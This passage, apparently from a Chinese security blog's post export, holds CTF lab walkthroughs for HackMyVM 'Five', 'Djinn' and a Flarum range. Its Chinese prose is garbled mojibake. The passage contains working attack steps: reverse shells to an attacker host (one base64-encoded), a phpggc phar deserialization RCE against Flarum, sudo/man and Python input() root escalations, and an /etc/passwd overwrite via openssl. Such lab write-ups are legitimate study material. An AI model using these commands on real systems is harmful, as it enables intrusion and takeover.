Debian-10+deb10u2\n~~~\n\nå¯ä»¥çœ‹åˆ°4444ç«¯å£æ˜¯sshç«¯å£ï¼Œç”¨socatå°†ç«¯å£è½¬å‘å‡ºæ¥\n\n~~~\nsocat TCP-LISTEN:4445,fork TCP4:127.0.0.1:4444 &\n~~~\n\nç„¶åcpä¸€ä¸ªå…¬é’¥è¿›å»\n\n~~~\nwww-data@five:/tmp$ ls\nauthorized_keys\nsystemd-private-51833796905d4c16b06d8f390a64e61b-systemd-timesyncd.service-LEvzQE\nuser.txt\nwww-data@five:/tmp$ sudo -u melisa cp ./authorized_keys /home/melisa/.ssh\n~~~\n\n# ææƒROOT\n\n~~~\nmelisa@five:~$ sudo -l\nMatching Defaults entries for melisa on five:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser melisa may run the following commands on five:\n    (ALL) SETENV: NOPASSWD: /bin/pwd, /bin/arch, /bin/man, /bin/id, /bin/rm, /bin/clear\n~~~\n\nå¯ä»¥ä»¥rootç”¨æˆ·è¿è¡Œman\n\n~~~\nsudo man man\n!/bin/sh\n~~~\n\nè¿™ä¸ªä¸è¡Œï¼ŒåŸå› æ˜¯å› ä¸ºåˆ†é¡µç”¨çš„æ˜¯pager\n\n~~~\n   Controlling formatted output\n       -P pager, --pager=pager\n              Specify  which  output  pager  to use.  By default, man uses pager, falling back to cat if pager is not\n              found or is not executable.  This option overrides the $MANPAGER environment variable,  which  in  turn\n              overrides the $PAGER environment variable.  It is not used in conjunction with -f or -k.\n\n              The  value  may  be a simple command name or a command with arguments, and may use shell quoting (backâ€\n              slashes, single quotes, or double quotes).  It may not use pipes to connect multiple commands;  if  you\n              need  that,  use a wrapper script, which may take the file to display either as an argument or on stanâ€\n              dard input.\n~~~\n\næŒ‡å®šlessä½œä¸ºåˆ†é¡µç”¨çš„å‘½ä»¤å°±è¡Œ\n\n~~~\nmelisa@five:~$ sudo man -P less id\n!bash\n~~~\n\n","tags":["é¶æœº"],"categories":["HackMyVM"]},{"title":"HackmyVM-Djinn","url":"/2025/05/06/HackmyVM-Djinn/","content":"\n# ä¿¡æ¯æœé›†\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:e7:50:e0       PCS Systemtechnik GmbH\n192.168.31.176  08:00:27:36:b4:d6       PCS Systemtechnik GmbH\n\n3 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 3.098 seconds (82.63 hosts/sec). 3 respondeds\n~~~\n\n192.168.31.176æ˜¯é¶æœºip\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# rustscan -a 192.168.31.176 -r 1-65535\n.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.\n| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |\n| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |\n`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'\nThe Modern Day Port Scanner.\n________________________________________\n: http://discord.skerritt.blog         :\n: https://github.com/RustScan/RustScan :\n --------------------------------------\nPlease contribute more quotes to our GitHub https://github.com/rustscan/rustscan\n\n[~] The config file is expected to be at \"/root/.rustscan.toml\"\n[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 65435'.\nOpen 192.168.31.176:21\nOpen 192.168.31.176:1337\nOpen 192.168.31.176:7331\n[~] Starting Script(s)\n[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-06 04:49 EDT\nInitiating ARP Ping Scan at 04:49\nScanning 192.168.31.176 [1 port]\nCompleted ARP Ping Scan at 04:49, 0.07s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 04:49\nCompleted Parallel DNS resolution of 1 host. at 04:49, 0.04s elapsed\nDNS resolution of 1 IPs took 0.04s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]\nInitiating SYN Stealth Scan at 04:49\nScanning 192.168.31.176 [3 ports]\nDiscovered open port 21/tcp on 192.168.31.176\nDiscovered open port 1337/tcp on 192.168.31.176\nDiscovered open port 7331/tcp on 192.168.31.176\nCompleted SYN Stealth Scan at 04:49, 0.02s elapsed (3 total ports)\nNmap scan report for 192.168.31.176\nHost is up, received arp-response (0.00032s latency).\nScanned at 2025-05-06 04:49:46 EDT for 0s\n\nPORT     STATE SERVICE REASON\n21/tcp   open  ftp     syn-ack ttl 64\n1337/tcp open  waste   syn-ack ttl 64\n7331/tcp open  swx     syn-ack ttl 64\nMAC Address: 08:00:27:36:B4:D6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nRead data files from: /usr/share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.26 seconds\n           Raw packets sent: 4 (160B) | Rcvd: 4 (160B)\n~~~\n\n# 21ç«¯å£\n\n21ç«¯å£å¯ä»¥åŒ¿åç™»å½•ï¼Œé‡Œé¢æœ‰ä¸‰ä¸ªæ–‡ä»¶\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# ftp anonymous@192.168.31.176\nConnected to 192.168.31.176.\n220 (vsFTPd 3.0.3)\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n229 Entering Extended Passive Mode (|||15556|)\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt\n-rw-r--r--    1 0        0             128 Oct 21  2019 game.txt\n-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt\n~~~\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# cat creds.txt\nnitu:81299\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# cat game.txt\noh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the\nfinal level and get the prize.\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# cat message.txt\n@nitish81299 I am going on holidays for few days, please take care of all the work.\nAnd don't mess up anything.\n~~~\n\nç»™äº†ä¸€ä¸ªç”¨æˆ·åï¼Œä¸€ä¸ªè´¦å·å¯†ç ï¼Œè¿˜æœ‰ä¸€ä¸ªæ¸¸æˆéƒ¨ç½²åœ¨1337ä¸Š\n\n# 1337ç«¯å£\n\nncè¿æ¥æ˜¯ä¸ªå£ç®—é¢˜å¡ï¼Œå†™ä¸ªè„šæœ¬\n\n~~~\nimport re\nimport socket\n\ndef get_question(s):\n    data = s.recv(1024).decode()\n    print(data)\n    question_re=re.search(r'(\\d.+)\\)',data)\n    if question_re:\n        question=question_re.group(1)\n        return question\n    else:\n        return None\ndef send_answer(s,answer):\n    print(answer)\n    s.sendall(answer.encode()+b'\\n')\ndef main():\n    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n    s.connect(('192.168.31.176',1337))\n    for _ in range(1,1002):\n        question=get_question(s)\n        if not question:\n            continue\n        print(question)\n        answer = str(eval(question.replace(',','').replace(\"'\",'')))\n        send_answer(s,answer)  \n    s.close()\nif __name__ == '__main__':\n    main()\n~~~\n\nä¼šç»™ä¸€ä¸ª`Here is your gift , I hope you know what to do with it: 1356, 6784, 3409`knockä¸€ä¸‹\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# knock 192.168.31.176 1356 6784 3409\n\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# rustscan -a 192.168.31.176 -r 1-65535\n.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.\n| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |\n| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |\n`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'\nThe Modern Day Port Scanner.\n________________________________________\n: http://discord.skerritt.blog         :\n: https://github.com/RustScan/RustScan :\n --------------------------------------\nI scanned ports so fast, even my computer was surprised.\n\n[~] The config file is expected to be at \"/root/.rustscan.toml\"\n[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 65435'.\nOpen 192.168.31.176:21\nOpen 192.168.31.176:22\nOpen 192.168.31.176:1337\nOpen 192.168.31.176:7331\n[~] Starting Script(s)\n[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-06 05:13 EDT\nInitiating ARP Ping Scan at 05:13\nScanning 192.168.31.176 [1 port]\nCompleted ARP Ping Scan at 05:13, 0.07s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 05:13\nCompleted Parallel DNS resolution of 1 host. at 05:13, 0.00s elapsed\nDNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]\nInitiating SYN Stealth Scan at 05:13\nScanning 192.168.31.176 [4 ports]\nDiscovered open port 21/tcp on 192.168.31.176\nDiscovered open port 22/tcp on 192.168.31.176\nDiscovered open port 7331/tcp on 192.168.31.176\nDiscovered open port 1337/tcp on 192.168.31.176\nCompleted SYN Stealth Scan at 05:13, 0.02s elapsed (4 total ports)\nNmap scan report for 192.168.31.176\nHost is up, received arp-response (0.00043s latency).\nScanned at 2025-05-06 05:13:30 EDT for 0s\n\nPORT     STATE SERVICE REASON\n21/tcp   open  ftp     syn-ack ttl 64\n22/tcp   open  ssh     syn-ack ttl 64\n1337/tcp open  waste   syn-ack ttl 64\n7331/tcp open  swx     syn-ack ttl 64\nMAC Address: 08:00:27:36:B4:D6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nRead data files from: /usr/share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.20 seconds\n           Raw packets sent: 5 (204B) | Rcvd: 5 (204B)\n~~~\n\nç°åœ¨22ç«¯å£å¼€äº†ï¼Œä½†æ˜¯ä¹‹å‰ç»™çš„è´¦å·å¯†ç ä¸å¯¹\n\n# 7331ç«¯å£\n\nçœ‹çœ‹7331ç«¯å£æ˜¯ä»€ä¹ˆï¼Œæ‰«ä¸€ä¸‹ç›®å½•ï¼Œèƒ½æ‰«åˆ°ä¸€ä¸ª`/wish`,æ˜¯ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤çš„åœ°æ–¹ï¼Œè¾“å…¥å‘½ä»¤æ‰§è¡Œä¹‹åä¼šè·³è½¬`http://192.168.31.176:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A`å‘½ä»¤ç¡®å®æ˜¯æ‰§è¡Œäº†ï¼Œåå¼¹ä¸ªshell\n\n~~~\necho YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjEyOS80NDQ0IDA+JjE=|base64 -d |bash\n~~~\n\n# ææƒSAM\n\nåœ¨/home/nitish/.devä¸‹æœ‰ä¸€ä¸ªå‡­è¯\n\n~~~\nwww-data@djinn:/home/nitish/.dev$ cat creds.txt\nnitish:p4ssw0rdStr3r0n9\n~~~\n\n~~~\nnitish@djinn:~$ sudo -l\nMatching Defaults entries for nitish on djinn:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser nitish may run the following commands on djinn:\n    (sam) NOPASSWD: /usr/bin/genie\n~~~\n\n~~~\nnitish@djinn:~$ sudo -u sam /usr/bin/genie -c '/bin/sh'\nPass your wish to GOD, he might be able to help you.\n~~~\n\nå“ˆå“ˆå“ˆå“ˆ -cä¸è¡Œï¼Œçœ‹çœ‹å…¶ä»–å‚æ•°ï¼Œmanæ‰‹å†Œé‡Œè¿˜æœ‰ä¸€ä¸ª-cmdçš„å‚æ•°\n\n~~~\nnitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd id\nmy man!!\n$ \n~~~\n\n# ææƒROOT\n\n~~~\nsam@djinn:~$ sudo -l\nMatching Defaults entries for sam on djinn:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser sam may run the following commands on djinn:\n    (root) NOPASSWD: /root/lago\n~~~\n\nsamçš„å®¶ç›®å½•ä¸‹æœ‰ä¸€ä¸ª.pyc,è¿›è¡Œåç¼–è¯‘\n\n~~~\n#!/usr/bin/env python\n# visit https://tool.lu/pyc/ for more information\n# Version: Python 2.7\n\nfrom getpass import getuser\nfrom os import system\nfrom random import randint\n\ndef naughtyboi():\n    print 'Working on it!! '\n\n\ndef guessit():\n    num = randint(1, 101)\n    print 'Choose a number between 1 to 100: '\n    s = input('Enter your number: ')\n    if s == num:\n        system('/bin/sh')\n    else:\n        print 'Better Luck next time'\n\n\ndef readfiles():\n    user = getuser()\n    path = input('Enter the full of the file to read: ')\n    print 'User %s is not allowed to read %s' % (user, path)\n\n\ndef options():\n    print 'What do you want to do ?'\n    print '1 - Be naughty'\n    print '2 - Guess the number'\n    print '3 - Read some damn files'\n    print '4 - Work'\n    choice = int(input('Enter your choice: '))\n    return choice\n\n\ndef main(op):\n    if op == 1:\n        naughtyboi()\n    elif op == 2:\n        guessit()\n    elif op == 3:\n        readfiles()\n    elif op == 4:\n        print 'work your ass off!!'\n    else:\n        print 'Do something better with your life'\n\nif __name__ == '__main__':\n    main(options())\n\n~~~\n\nå¯ä»¥ç›´æ¥ä¼ å…¥ä¸€ä¸ªnumï¼Œä»–ä¼šå°†ä½ ä¼ å…¥çš„numè§£ææˆå˜é‡å°±å¯ä»¥é€šè¿‡äº†ï¼Œæˆ–è€…å°±çˆ†ç ´æˆ‘å°±ä¸è¯•äº†\n\n~~~\nsam@djinn:/home/sam$ sudo /root/lago\nWhat do you want to do ?\n1 - Be naughty\n2 - Guess the number\n3 - Read some damn files\n4 - Work\nEnter your choice:2\nChoose a number between 1 to 100:\nEnter your number: num\n# id\nuid=0(root) gid=0(root) groups=0(root)\n~~~\n\n","tags":["é¶æœº"],"categories":["HackMyVM"]},{"title":"æ˜¥ç§‹äº‘é•œ-Flarum","url":"/2025/05/05/æ˜¥ç§‹äº‘é•œ-Flarum/","content":"\n\n\n# FLAG01\n\nfscan å…ˆæ‰«æä¸€ä¸‹\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# ../pentest/fscan/fscan2 -h 39.98.127.236\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     _ __  __ _ _ __ __ _  _ __| | __    â”‚\nâ”‚  / /_\\/____/ _ _|/ _ _| '_ _/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_ ____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\_ _,_|\\___|_|\\_\\    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-05-04 22:56:34] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-05-04 22:56:34] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-05-04 22:56:34] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1\n[2025-05-04 22:56:34] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-05-04 22:56:34] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\n[2025-05-04 22:56:34] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.127.236:22\n[2025-05-04 22:56:34] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.127.236:80\n[2025-05-04 22:56:34] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.127.236:22 => [ssh] ç‰ˆæœ¬: 8.9p1 Ubuntu 3ubuntu0.3 äº§å“: OpenSSH ç³»ç»Ÿ: Linux ä¿¡æ¯: Ubuntu Linux; protocol 2.0 Banner: [SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.3.]\n[2025-05-04 22:56:41] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.127.236:80 => [http]\n[2025-05-04 22:56:43] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 2\n[2025-05-04 22:56:43] [INFO] å¼€å§‹æ¼æ´æ‰«æ\n[2025-05-04 22:56:43] [INFO] åŠ è½½çš„æ’ä»¶: ssh, webpoc, webtitle\n[2025-05-04 22:56:43] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.98.127.236      çŠ¶æ€ç : 200 é•¿åº¦: 5882   æ ‡é¢˜: éœ„å£¤ç¤¾åŒº\n[2025-05-04 22:56:56] [SUCCESS] æ‰«æå·²å®Œæˆ: 3/3\n~~~\n\né¡µé¢ä¸Šç»™äº†ä¸€ä¸ªé‚®ç®± `administrator@xiaorang.lab` å¾ˆæ˜æ˜¾å°±æ˜¯ç®¡ç†å‘˜çš„é‚®ç®±ï¼Œç„¶åçˆ†ç ´å¯†ç å¾—åˆ° `1chris`\n\nåå°ç®¡ç†æ˜¾ç¤ºæ¡†æ¶æ˜¯ `Flarum 1.6.0`\n\n[å‚è€ƒæ–‡ç« ](https://www.leavesongs.com/PENETRATION/flarum-rce-tour.html)\n\né¦–å…ˆä¸‹è½½ä¸€ä¸ª [phpggc](https://github.com/ambionics/phpggc#) ç„¶åç”Ÿæˆä¸€ä¸ªåå¼¹ shell çš„è¯­å¥\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp/phpggc]\nâ””â”€# ./phpggc -p tar -b Monolog/RCE6 system \"bash -c 'bash -i >& /dev/tcp/VPS/PORT 0 >&1'\"\n~~~\n\nç„¶ååœ¨åå°å¤–è§‚-> è‡ªå®šä¹‰æ ·å¼é‡Œé¢æ·»åŠ \n\n~~~\n@import (inline) 'data:text/css;base64,xxx';\n~~~\n\nè®¿é—® URL/assets/forum.css, å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„åå¼¹ shell çš„è¯­å¥å·²ç»è¢«å†™è¿›å»äº†\n\nç„¶ååœ¨è‡ªå®šä¹‰æ ·å¼é‡Œé¢ä¿®æ”¹æˆ\n\n~~~\n.test {\n  content: data-uri(\"phar://./assets/forum.css\");\n}\n~~~\n\nç„¶åä¿å­˜ï¼Œshell å°±è¢«å¼¹å‡ºæ¥äº†ï¼Œç„¶åå¼€å§‹ææƒ\n\n~~~\nwww-data@web01:/$ getcap -r / 2 >/dev/null\n/snap/core20/1974/usr/bin/ping cap_net_raw = ep\n/snap/core20/1405/usr/bin/ping cap_net_raw = ep\n/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service, cap_net_admin = ep\n/usr/bin/openssl = ep\n/usr/bin/mtr-packet cap_net_raw = ep\n/usr/bin/ping cap_net_raw = ep\n~~~\n\nå¯ä»¥çœ‹åˆ° openssl å…·æœ‰ sgid çš„æƒé™ï¼Œå†™æ–‡ä»¶ææƒï¼\n\n~~~\nwww-data@web01:/tmp$ cat passwd \nroot: x: 0:0: root:/root:/bin/bash\ndaemon: x: 1:1: daemon:/usr/sbin:/usr/sbin/nologin\nbin: x: 2:2: bin:/bin:/usr/sbin/nologin\nsys: x: 3:3: sys:/dev:/usr/sbin/nologin\nsync: x: 4:65534: sync:/bin:/bin/sync\ngames: x: 5:60: games:/usr/games:/usr/sbin/nologin\nman: x: 6:12: man:/var/cache/man:/usr/sbin/nologin\nlp: x: 7:7: lp:/var/spool/lpd:/usr/sbin/nologin\nmail: x: 8:8: mail:/var/mail:/usr/sbin/nologin\nnews: x: 9:9: news:/var/spool/news:/usr/sbin/nologin\nuucp: x: 10:10: uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy: x: 13:13: proxy:/bin:/usr/sbin/nologin\nwww-data: x: 33:33: www-data:/var/www:/usr/sbin/nologin\nbackup: x: 34:34: backup:/var/backups:/usr/sbin/nologin\nlist: x: 38:38: Mailing List Manager:/var/list:/usr/sbin/nologin\nirc: x: 39:39: ircd:/run/ircd:/usr/sbin/nologin\ngnats: x: 41:41: Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody: x: 65534:65534: nobody:/nonexistent:/usr/sbin/nologin\n_apt: x: 100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network: x: 101:102: systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve: x: 102:103: systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus: x: 103:104::/nonexistent:/usr/sbin/nologin\nsystemd-timesync: x: 104:105: systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\npollinate: x: 105:1::/var/cache/pollinate:/bin/false\nsshd: x: 106:65534::/run/sshd:/usr/sbin/nologin\nsyslog: x: 107:113::/home/syslog:/usr/sbin/nologin\nuuidd: x: 108:114::/run/uuidd:/usr/sbin/nologin\ntcpdump: x: 109:115::/nonexistent:/usr/sbin/nologin\ntss: x: 110:116: TPM software stack,,,:/var/lib/tpm:/bin/false\nlandscape: x: 111:117::/var/lib/landscape:/usr/sbin/nologin\nusbmux: x: 112:46: usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nlxd: x: 999:100::/var/snap/lxd/common/lxd:/bin/false\nntp: x: 113:118::/nonexistent:/usr/sbin/nologin\n_chrony: x: 114:124: Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin\nfwupd-refresh: x: 115:125: fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\nmysql: x: 116:127: MySQL Server,,,:/nonexistent:/bin/false\nll: $1$ Zg12rJZk$P7IV1RqAT005RKjprDSo41:0:0: root:/root:/bin/bash\nwww-data@web01:/tmp$ cat passwd |openssl enc -out /etc/passwd\nwww-data@web01:/tmp$ su - ll\nPassword: \nroot@web01:~# \n~~~\n\nflag åœ¨/root ä¸‹\n\n# FLAG03\n\nä¸Šä¼  fscan å†åšä¸€ä¸ªä»£ç†ï¼Œfscan æ‰«ï¼\n\n~~~\nroot@web01:~# ip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 :: 1/128 scope host\n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e: 32:30: a9 brd ff: ff: ff: ff: ff: ff\n    altname enp0s5\n    altname ens5\n    inet 172.22.60.52/16 metric 100 brd 172.22.255.255 scope global dynamic eth0\n       valid_lft 315359312sec preferred_lft 315359312sec\n    inet6 fe80:: 216:3eff: fe32:30a9/64 scope link\n       valid_lft forever preferred_lft forever\nroot@web01:~# ./fscan2 -h  172.22.60.52/24\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     _ __  __ _ _ __ __ _  _ __| | __    â”‚\nâ”‚  / /_\\/____/ _ _|/ _ _| '_ _/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_ ____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\_ _,_|\\___|_|\\_\\    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-05-05 11:28:42] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-05-05 11:28:42] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-05-05 11:28:42] [INFO] CIDR èŒƒå›´: 172.22.60.0-172.22.60.255\n[2025-05-05 11:28:42] [INFO] ç”Ÿæˆ IP èŒƒå›´: 172.22.60.0.%! d(string = 172.22.60.255) - %! s(MISSING).%! d(MISSING)\n[2025-05-05 11:28:42] [INFO] è§£æ CIDR 172.22.60.52/24 -> IP èŒƒå›´ 172.22.60.0-172.22.60.255\n[2025-05-05 11:28:42] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256\n[2025-05-05 11:28:42] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-05-05 11:28:42] [SUCCESS] ç›®æ ‡ 172.22.60.52    å­˜æ´» (ICMP)\n[2025-05-05 11:28:42] [SUCCESS] ç›®æ ‡ 172.22.60.8     å­˜æ´» (ICMP)\n[2025-05-05 11:28:42] [SUCCESS] ç›®æ ‡ 172.22.60.15    å­˜æ´» (ICMP)\n[2025-05-05 11:28:42] [SUCCESS] ç›®æ ‡ 172.22.60.42    å­˜æ´» (ICMP)\n[2025-05-05 11:28:45] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4\n[2025-05-05 11:28:45] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\n[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.8:88\n[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.8:389\n[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.42:139\n[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.15:139\n[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.8:139\n[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.42:135\n[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.15:135\n[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.8:135\n[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.42:445\n[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.15:445\n[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.8:445\n[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.52:22\n[2025-05-05 11:28:45] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.60.52:80\n[2025-05-05 11:28:46] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.52:22 => [ssh] ç‰ˆæœ¬: 8.9p1 Ubuntu 3ubuntu0.3 äº§å“: OpenSSH ç³»ç»Ÿ: Linux  ä¿¡æ¯: Ubuntu Linux; protocol 2.0 Banner: [SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.3.]\n[2025-05-05 11:28:50] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.8:88 =>\n[2025-05-05 11:28:50] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.42:139 =>  Banner: [.]\n[2025-05-05 11:28:50] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.8:389 =>\n[2025-05-05 11:28:50] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.15:139 =>  Banner: [.]\n[2025-05-05 11:28:50] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.8:139 =>  Banner: [.]\n[2025-05-05 11:28:51] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.42:445 =>\n[2025-05-05 11:28:51] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.15:445 =>\n[2025-05-05 11:28:51] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.8:445 =>\n[2025-05-05 11:28:51] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.52:80 => [http]\n[2025-05-05 11:29:50] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.42:135 =>\n[2025-05-05 11:29:50] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.15:135 =>\n[2025-05-05 11:29:51] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.60.8:135 =>\n[2025-05-05 11:29:51] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 13\n[2025-05-05 11:29:51] [INFO] å¼€å§‹æ¼æ´æ‰«æ\n[2025-05-05 11:29:51] [INFO] åŠ 